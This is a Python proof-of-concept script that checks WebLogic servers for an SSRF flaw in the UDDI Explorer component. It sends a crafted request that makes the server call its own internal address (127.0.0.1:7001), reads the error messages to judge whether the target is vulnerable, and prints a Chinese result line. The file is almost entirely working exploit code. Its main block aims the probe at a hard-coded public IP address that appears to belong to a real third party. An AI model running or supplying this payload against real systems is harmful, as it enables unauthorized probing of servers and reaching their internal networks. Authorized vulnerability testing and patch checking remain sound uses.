#!/usr/bin/env python
# _*_ coding:utf-8 _*_

import requests

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0'}


def poc(url):
    if '://' not in str(url):
        url = 'http://' + url
    payload = "uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001"
    url = url + payload
    try:
        req = requests.get(url, timeout=10, headers=headers, verify=False)
        if "weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and "IO Exception on sendMessage" not in req.text:
            result = "目标WebLogic存在 ssrf 漏洞 : %s" % url
            return result
    except:
        pass


if __name__ == "__main__":
    a = poc('167.86.78.228:7001')
    print(a)
